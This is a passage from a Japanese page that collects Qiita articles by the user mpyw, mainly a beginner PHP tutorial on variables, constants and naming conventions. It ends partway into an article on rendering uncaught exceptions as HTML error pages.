<div class="highlight"><pre><span></span><span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">);</span>
<span class="nb">unset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span>array(4) {
  [0]=&gt;
  string(1) "A"
  [2]=&gt;
  string(1) "C"
}
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />41位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>25</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/95e205056e25b7a59dfa">【PHP入門講座】 変数と定数</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-11-25 15:49:25</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP入門講座]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h3>
<span id="目次に戻る" class="fragment"></span><a href="#%E7%9B%AE%E6%AC%A1%E3%81%AB%E6%88%BB%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/752e19a578cf7d96fc5f" id="reference-f150293c9e65253ac475">目次に戻る</a>
</h3>

<h1>
<span id="変数variable" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0variable"><i class="fa fa-link"></i></a>変数(variable)</h1>

<h2>
<span id="変数って何" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0%E3%81%A3%E3%81%A6%E4%BD%95"><i class="fa fa-link"></i></a>変数って何？</h2>

<p><strong>値を一時的に記録しておくための箱</strong> だと思ってください。PHPでは全ての変数の頭には <code>$</code> 記号をつけるお約束になっています。代入演算子 <code>=</code> を用いて <strong>右から左へ</strong> 値を設定することが出来ます。例えば以下のような使い方が出来るでしょう。</p>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$var1</span> <span class="o">=</span> <span class="s1">'Good Moring'</span><span class="p">;</span>
<span class="nv">$state</span> <span class="o">=</span> <span class="s1">'I am awake'</span><span class="p">;</span>
<span class="nv">$var2</span> <span class="o">=</span> <span class="s1">'Good Afternoon'</span><span class="p">;</span>
<span class="nv">$var3</span> <span class="o">=</span> <span class="s1">'Good Night'</span><span class="p">;</span>
<span class="nv">$state</span> <span class="o">=</span> <span class="s1">'I am sleeping'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>State: <span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$state</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$var1</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$var2</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$var3</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>State: I am sleeping<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>Good Morning<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>Good Afternoon<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>Good Night<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</pre></div>
</div>

<p>C言語など型制約の厳しい言語だけを経験してきた人から見ればすごく奇妙に思われるかもしれませんが、PHPでは<ins>変数宣言は必要ありません</ins>。いきなり代入して使うことが出来ます。</p>

<h2>
<span id="何かいきなり---で括ったりしてるけどこれ何" class="fragment"></span><a href="#%E4%BD%95%E3%81%8B%E3%81%84%E3%81%8D%E3%81%AA%E3%82%8A---%E3%81%A7%E6%8B%AC%E3%81%A3%E3%81%9F%E3%82%8A%E3%81%97%E3%81%A6%E3%82%8B%E3%81%91%E3%81%A9%E3%81%93%E3%82%8C%E4%BD%95"><i class="fa fa-link"></i></a>何かいきなり <code>' '</code> で括ったりしてるけどこれ何？</h2>

<p><strong>文字列</strong> であることを示す記号です。 コード中に登場するあらゆる文字列は <code>' '</code> <strong>(シングルクオーテーション)</strong> または <code>" "</code> <strong>(ダブルクオーテーション)</strong> で括られている必要があります。しかし、先ほどの</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</pre></div></div>

<p>の例ではそんなものはありませんでした。 これは <code>1</code> が文字列ではなく <strong>整数</strong> であるからです。整数を出力する際には、先ほど</p>

<blockquote>
<p><code>echo</code> は指定したものを文字列として書き出す <strong>（出力する）</strong> 命令です。</p>
</blockquote>

<p>と述べたように、文字列に変換されて出力が行われます。なお、出力を行わない段階での <code>1</code> と <code>'1'</code> は区別されます。前者は <strong>整数型</strong> 、後者は <strong>文字列型</strong> といいます。型については後々で詳しく説明しますので、ここではさらっと流してください。</p>

<h2>
<span id="変数名に使える文字は" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0%E5%90%8D%E3%81%AB%E4%BD%BF%E3%81%88%E3%82%8B%E6%96%87%E5%AD%97%E3%81%AF"><i class="fa fa-link"></i></a>変数名に使える文字は？</h2>

<h3>
<span id="okな例" class="fragment"></span><a href="#ok%E3%81%AA%E4%BE%8B"><i class="fa fa-link"></i></a>OKな例</h3>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$abc
$_abc_
$abcABC012
$あいうえお
</pre></div></div>

<p>PHPで特別な意味を持つ文字でなければたいていどんな文字でも使えてしまいます。日本語も使えますが、一般的には用いられません。</p>

<h3>
<span id="ngな例" class="fragment"></span><a href="#ng%E3%81%AA%E4%BE%8B"><i class="fa fa-link"></i></a>NGな例</h3>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$
$ a b c
$-abc-
$0abc
</pre></div></div>

<p>明らかにダメっぽいものばかりが並びますが、4つ目は何かOKっぽいですよね？しかし、<ins>数字で始まってはいけない</ins>という決まりがあるため、これはNGとなります。</p>

<h3>
<span id="ngなはずなのに無理やりokをもらってみた例" class="fragment"></span><a href="#ng%E3%81%AA%E3%81%AF%E3%81%9A%E3%81%AA%E3%81%AE%E3%81%AB%E7%84%A1%E7%90%86%E3%82%84%E3%82%8Aok%E3%82%92%E3%82%82%E3%82%89%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F%E4%BE%8B"><i class="fa fa-link"></i></a>NGなはずなのに無理やりOKをもらってみた例</h3>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>${''}
${'a b c'}
${'-abc-'}
${'0abc'}
</pre></div></div>

<p><code>$</code> の直後に <code>{ }</code> を配置すれば、その中に<ins>どんな文字列でも書ける</ins>、という気持ち悪い特性を持っているのがPHPです。こんな例は他の言語ではあまり見ません。値を取得するときにも同じように書かないといけないため非常に煩わしく、PHPでもあまり用いられることはありません。</p>

<h2>
<span id="変数名をつけるときに気を付けることは" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0%E5%90%8D%E3%82%92%E3%81%A4%E3%81%91%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AB%E6%B0%97%E3%82%92%E4%BB%98%E3%81%91%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>変数名をつけるときに気を付けることは？</h2>

<h3>
<span id="意味が分かりやすいようにつける" class="fragment"></span><a href="#%E6%84%8F%E5%91%B3%E3%81%8C%E5%88%86%E3%81%8B%E3%82%8A%E3%82%84%E3%81%99%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%A4%E3%81%91%E3%82%8B"><i class="fa fa-link"></i></a>意味が分かりやすいようにつける</h3>

<ul>
<li>変数 → <code>$var</code>
</li>
<li>日付 → <code>$date</code>
</li>
<li>結果 → <code>$result</code>
</li>
</ul>

<p>例外的に、何かを数えるときに <code>$i</code> <code>$j</code> <code>$k</code> を用いることは広く認められているようです。</p>

<h3>
<span id="ローマ字読みをやめる" class="fragment"></span><a href="#%E3%83%AD%E3%83%BC%E3%83%9E%E5%AD%97%E8%AA%AD%E3%81%BF%E3%82%92%E3%82%84%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>ローマ字読みをやめる</h3>

<p><code>$hensuu</code> <code>$hiduke</code> <code>$kekka</code> とか見ると何故か(私を含む)多くのプログラマが発狂しそうになるので是非とも控えてあげましょう。英語が苦手な人はもうちょっと勉強してください。</p>

<h3>
<span id="小文字のスネークケースで書く" class="fragment"></span><a href="#%E5%B0%8F%E6%96%87%E5%AD%97%E3%81%AE%E3%82%B9%E3%83%8D%E3%83%BC%E3%82%AF%E3%82%B1%E3%83%BC%E3%82%B9%E3%81%A7%E6%9B%B8%E3%81%8F"><i class="fa fa-link"></i></a>小文字のスネークケースで書く</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">スネークケースの例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$the_pencil</span>
<span class="nv">$a_lot_of_pencils</span>
</pre></div>
</div>

<p>蛇(Snake)のように長く繋がっていることからこう呼ばれます。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">キャメルケースの例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$thePencil</span>
<span class="nv">$aLotOfPencils</span>
</pre></div>
</div>

<p>ラクダ(Camel)の瘤のように凹凸があることからこう呼ばれます。</p>

<p>PHPでは一般的に「変数」「関数」ではスネークケース、「プロパティ」「メソッド」ではキャメルケースが用いられる傾向にあります。「変数」以外に関しては後々触れることになります。とりあえず熟語を変数名にする際は、<ins>全て小文字でアンダーバーで単語をつなぐ</ins>ように心がけてください。</p>

<h1>
<span id="定数constant" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0constant"><i class="fa fa-link"></i></a>定数(constant)</h1>

<h2>
<span id="定数って何" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0%E3%81%A3%E3%81%A6%E4%BD%95"><i class="fa fa-link"></i></a>定数って何？</h2>

<p><strong>値を半永久的に記録しておくための箱</strong> です。変数と違って、(そのコードの実行中は)一度定義した定数は変更することが出来ません。定数は(PHP5.3以降では) <code>const</code> キーワードを使って定義することが出来ます。</p>

<div class="code-frame" data-lang="html+php">
<div class="code-lang"><span class="bold">PHPコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">const</span> <span class="no">TEST</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">test</span> <span class="o">=</span> <span class="s1">'B'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
<span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">TEST</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">test</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>A<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>B<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</pre></div>
</div>

<p>定数</p>

<h2>
<span id="定数名に使える文字は" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0%E5%90%8D%E3%81%AB%E4%BD%BF%E3%81%88%E3%82%8B%E6%96%87%E5%AD%97%E3%81%AF"><i class="fa fa-link"></i></a>定数名に使える文字は？</h2>

<h3>
<span id="okな例ngな例" class="fragment"></span><a href="#ok%E3%81%AA%E4%BE%8Bng%E3%81%AA%E4%BE%8B"><i class="fa fa-link"></i></a>OKな例<br>NGな例</h3>

<p>変数と全く同じです。</p>

<h3>
<span id="ngなはずなのに無理やりokをもらってみた例-1" class="fragment"></span><a href="#ng%E3%81%AA%E3%81%AF%E3%81%9A%E3%81%AA%E3%81%AE%E3%81%AB%E7%84%A1%E7%90%86%E3%82%84%E3%82%8Aok%E3%82%92%E3%82%82%E3%82%89%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%9F%E4%BE%8B-1"><i class="fa fa-link"></i></a>NGなはずなのに無理やりOKをもらってみた例</h3>

<p>PHPでは <code>const</code> キーワードに加えて <code>define</code> 関数が用意されています。PHP5.2以前では逆にこの方法しか使うことが出来ません。この関数を使えば、定数の命名制限を無視してどんな文字列でも設定することが出来ます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">define</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="s1">'A'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'a b c'</span><span class="p">,</span> <span class="s1">'A'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'-abc-'</span><span class="p">,</span> <span class="s1">'A'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'0abc'</span><span class="p">,</span> <span class="s1">'A'</span><span class="p">);</span>
</pre></div></div>

<p>なお、このようにして無理やり作られた定数の値を取得するときには、 <code>constant</code> 関数を使う必要があります。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">echo</span> <span class="nb">constant</span><span class="p">(</span><span class="s1">'0abc'</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="定数名をつけるときに気を付けることは" class="fragment"></span><a href="#%E5%AE%9A%E6%95%B0%E5%90%8D%E3%82%92%E3%81%A4%E3%81%91%E3%82%8B%E3%81%A8%E3%81%8D%E3%81%AB%E6%B0%97%E3%82%92%E4%BB%98%E3%81%91%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>定数名をつけるときに気を付けることは？</h2>

<h3>
<span id="意味が分かりやすいようにつけるローマ字読みをやめる" class="fragment"></span><a href="#%E6%84%8F%E5%91%B3%E3%81%8C%E5%88%86%E3%81%8B%E3%82%8A%E3%82%84%E3%81%99%E3%81%84%E3%82%88%E3%81%86%E3%81%AB%E3%81%A4%E3%81%91%E3%82%8B%E3%83%AD%E3%83%BC%E3%83%9E%E5%AD%97%E8%AA%AD%E3%81%BF%E3%82%92%E3%82%84%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>意味が分かりやすいようにつける<br>ローマ字読みをやめる</h3>

<p>半永久的に使われ続けるので、変数以上によく検討してから名前を付けるようにしてください。</p>

<h3>
<span id="大文字のスネークケースで書く" class="fragment"></span><a href="#%E5%A4%A7%E6%96%87%E5%AD%97%E3%81%AE%E3%82%B9%E3%83%8D%E3%83%BC%E3%82%AF%E3%82%B1%E3%83%BC%E3%82%B9%E3%81%A7%E6%9B%B8%E3%81%8F"><i class="fa fa-link"></i></a>大文字のスネークケースで書く</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">スネークケースの例</span></div>
<div class="highlight"><pre><span></span><span class="k">const</span> <span class="no">SITE_NAME</span> <span class="o">=</span> <span class="s1">'Sample Site'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">SITE_URL</span> <span class="o">=</span> <span class="s1">'http://example.com/'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">SINCE</span> <span class="o">=</span> <span class="mi">2013</span><span class="p">;</span>
</pre></div>
</div>

<p><ins>定数名は全て大文字</ins>という慣習がありますので、原則的にはそれに従いましょう。</p>

<h1>
<span id="その他" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE%E4%BB%96"><i class="fa fa-link"></i></a>その他</h1>

<h2>
<span id="const-と-define-のどちらを使うべきか" class="fragment"></span><a href="#const-%E3%81%A8-define-%E3%81%AE%E3%81%A9%E3%81%A1%E3%82%89%E3%82%92%E4%BD%BF%E3%81%86%E3%81%B9%E3%81%8D%E3%81%8B"><i class="fa fa-link"></i></a><code>const</code> と <code>define</code> のどちらを使うべきか？</h2>

<p><code>define</code> にしか出来ないことがいくつかあります。</p>

<h3>
<span id="その1-動的に宣言する" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE1-%E5%8B%95%E7%9A%84%E3%81%AB%E5%AE%A3%E8%A8%80%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>その1. 動的に宣言する</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">OKな例</span></div>
<div class="highlight"><pre><span></span><span class="nb">define</span><span class="p">(</span><span class="s1">'ONE_PLUS_ONE'</span><span class="p">,</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">NGな例</span></div>
<div class="highlight"><pre><span></span><span class="k">const</span> <span class="no">ONE_PLUS_ONE</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</pre></div>
</div>

<h3>
<span id="その2-大文字と小文字を区別しない宣言ができる" class="fragment"></span><a href="#%E3%81%9D%E3%81%AE2-%E5%A4%A7%E6%96%87%E5%AD%97%E3%81%A8%E5%B0%8F%E6%96%87%E5%AD%97%E3%82%92%E5%8C%BA%E5%88%A5%E3%81%97%E3%81%AA%E3%81%84%E5%AE%A3%E8%A8%80%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B"><i class="fa fa-link"></i></a>その2. 大文字と小文字を区別しない宣言ができる</h3>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">constで大文字小文字を区別しない対応を強いられるとこうなる</span></div>
<div class="highlight"><pre><span></span><span class="k">const</span> <span class="no">ab</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">aB</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">Ab</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
<span class="k">const</span> <span class="no">AB</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">defineならば第3引数にTrueを指定して1回で済ませられる</span></div>
<div class="highlight"><pre><span></span><span class="nb">define</span><span class="p">(</span><span class="s1">'ab'</span><span class="p">,</span> <span class="s1">'A'</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</pre></div>
</div>

<p><code>const</code> で済むならそちらで済ませたほうが「定数らしく」はなるでしょう。</p>

<h2>
<span id="変数と定数の使い分けは" class="fragment"></span><a href="#%E5%A4%89%E6%95%B0%E3%81%A8%E5%AE%9A%E6%95%B0%E3%81%AE%E4%BD%BF%E3%81%84%E5%88%86%E3%81%91%E3%81%AF"><i class="fa fa-link"></i></a>変数と定数の使い分けは？</h2>

<h3>
<span id="格納できる値" class="fragment"></span><a href="#%E6%A0%BC%E7%B4%8D%E3%81%A7%E3%81%8D%E3%82%8B%E5%80%A4"><i class="fa fa-link"></i></a>格納できる値</h3>

<ul>
<li>変数<br>→ あらゆる値</li>
<li>定数<br>→ スカラー値(整数・文字列など)</li>
</ul>

<h3>
<span id="アクセスできる範囲" class="fragment"></span><a href="#%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%81%A7%E3%81%8D%E3%82%8B%E7%AF%84%E5%9B%B2"><i class="fa fa-link"></i></a>アクセスできる範囲</h3>

<ul>
<li>変数<br>→ 限られている</li>
<li>定数<br>→ どこからでもアクセスできる</li>
</ul>

<h3>
<span id="後から変更可能か" class="fragment"></span><a href="#%E5%BE%8C%E3%81%8B%E3%82%89%E5%A4%89%E6%9B%B4%E5%8F%AF%E8%83%BD%E3%81%8B"><i class="fa fa-link"></i></a>後から変更可能か</h3>

<ul>
<li>変数<br>→ 変更可能</li>
<li>定数<br>→ 変更不能</li>
</ul>

<p>基本的には変数を使い、スクリプト実行中に不変の <strong>「サイト名」</strong> などには定数を用いると良いでしょう。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />42位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>23</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/0a2307c5ba5a0c73849e">キャッチされなかった例外をHTML整形して表示する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-25 11:25:31</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[例外]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="前書き" class="fragment"></span><a href="#%E5%89%8D%E6%9B%B8%E3%81%8D"><i class="fa fa-link"></i></a><strong>前書き</strong>
</h1>

<p>オレオレフレームワークを使った開発やノンフレームワークな開発してるときのこと。例外が発生してそれをキャッチしなかったときは</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>Fatal Error: Uncaught Exception 'Exception' with message ...
</pre></div></div>

<p>このようなエラーメッセージが出て強制終了されてしまいますよね。全ての例外をキャッチして正しくHTMLを表示させるのが原則ですが、毎回毎回こういった対応するのも面倒な話です。そこで、これを自動化させてみようと考えました。</p>

<h1>
<span id="基本" class="fragment"></span><a href="#%E5%9F%BA%E6%9C%AC"><i class="fa fa-link"></i></a><strong>基本</strong>
</h1>

<h2>
<span id="コーディングポリシー" class="fragment"></span><a href="#%E3%82%B3%E3%83%BC%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%9D%E3%83%AA%E3%82%B7%E3%83%BC"><i class="fa fa-link"></i></a><strong>コーディングポリシー</strong>
</h2>

<p>多少冗長な書き方になってもいいので、以下の原則を遵守することにします。</p>

<ul>
<li>グローバル空間を変数や関数で汚してはならない</li>
<li>他のファイルに依存するコードを書いてはならない</li>
<li>あらゆる可能性を想定してハンドラ内部でのエラーや例外を徹底的に防止する</li>
<li>デバッグ時とリリース時で表示レベルを切り分けられるようにする</li>
</ul>

<h2>
<span id="前提条件" class="fragment"></span><a href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><i class="fa fa-link"></i></a><strong>前提条件</strong>
</h2>

<h3>
<span id="バッファリングを行う" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%83%95%E3%82%A1%E3%83%AA%E3%83%B3%E3%82%B0%E3%82%92%E8%A1%8C%E3%81%86"><i class="fa fa-link"></i></a><strong>バッファリングを行う</strong>
</h3>

<p>途中で出力した文字列を後から消去してきれいに表示させたいので、バッファリングを行っていることが条件となります。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">ob_start</span><span class="p">();</span>
</pre></div></div>

<p>バッファリングが行われなかった場合の挙動は未定義です。</p>

<h3>
<span id="phpのバージョンが53以降である" class="fragment"></span><a href="#php%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%81%8C53%E4%BB%A5%E9%99%8D%E3%81%A7%E3%81%82%E3%82%8B"><i class="fa fa-link"></i></a><strong>PHPのバージョンが5.3以降である</strong>
</h3>

<p>以下のものはこのバージョン以降でしかサポートされていません。</p>

<ul>
<li><strong><a href="http://www.php.net/manual/ja/functions.anonymous.php" rel="nofollow noopener" target="_blank">無名関数(クロージャ)</a></strong></li>
<li>
<strong><a href="http://www.php.net/manual/ja/exception.getprevious.php" rel="nofollow noopener" target="_blank">Exception::getPrevious</a></strong> メソッド</li>
<li>
<strong><a href="http://www.php.net/manual/ja/function.header-remove.php" rel="nofollow noopener" target="_blank">header_remove</a></strong> 関数</li>
</ul>

<h2>
<span id="httpステータスコード" class="fragment"></span><a href="#http%E3%82%B9%E3%83%86%E3%83%BC%E3%82%BF%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a><strong>HTTPステータスコード</strong>
</h2>

<h3>
<span id="デバッグ時" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E6%99%82"><i class="fa fa-link"></i></a><strong>デバッグ時</strong>
</h3>

<ul>
<li>常に <code>500</code> <strong>Internal Server Error</strong>
</li>
</ul>

<h3>
<span id="リリース時" class="fragment"></span><a href="#%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E6%99%82"><i class="fa fa-link"></i></a><strong>リリース時</strong>
</h3>

<ul>
<li>表示可能なメッセージがあれば <code>400</code> <strong>Bad Request</strong>
</li>
<li>表示可能なメッセージがなければ <code>500</code> <strong>Internal Server Error</strong>
</li>
</ul>

<h2>
<span id="表示レベル" class="fragment"></span><a href="#%E8%A1%A8%E7%A4%BA%E3%83%AC%E3%83%99%E3%83%AB"><i class="fa fa-link"></i></a><strong>表示レベル</strong>
</h2>

<h3>
<span id="デバッグ時-1" class="fragment"></span><a href="#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E6%99%82-1"><i class="fa fa-link"></i></a><strong>デバッグ時</strong>
</h3>

<ul>
<li>全ての例外に関して、発生した行やファイルといった情報も含めて詳細に表示する</li>
</ul>

<h3>
<span id="リリース時-1" class="fragment"></span><a href="#%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E6%99%82-1"><i class="fa fa-link"></i></a><strong>リリース時</strong>
</h3>

<h4>
<span id="表示しないもの" class="fragment"></span><a href="#%E8%A1%A8%E7%A4%BA%E3%81%97%E3%81%AA%E3%81%84%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>表示しないもの</h4>

<ul>
<li>PHPコアによって自動生成された例外</li>
<li>エクステンションによって自動生成された例外</li>
<li>
<strong><a href="http://php.net/manual/ja/class.logicexception.php" rel="nofollow noopener" target="_blank">LogicException</a></strong> 例外とその継承例外</li>
<li>
<strong><a href="http://php.net/manual/ja/class.errorexception.php" rel="nofollow noopener" target="_blank">ErrorException</a></strong> 例外とその継承例外</li>
</ul>

<h4>
<span id="表示するもの" class="fragment"></span><a href="#%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>表示するもの</h4>

<ul>
<li>プログラマによって生成された、上記に該当しない全ての例外</li>
</ul>

<h2>
<span id="動作のカスタム" class="fragment"></span><a href="#%E5%8B%95%E4%BD%9C%E3%81%AE%E3%82%AB%E3%82%B9%E3%82%BF%E3%83%A0"><i class="fa fa-link"></i></a><strong>動作のカスタム</strong>
</h2>

<h3>
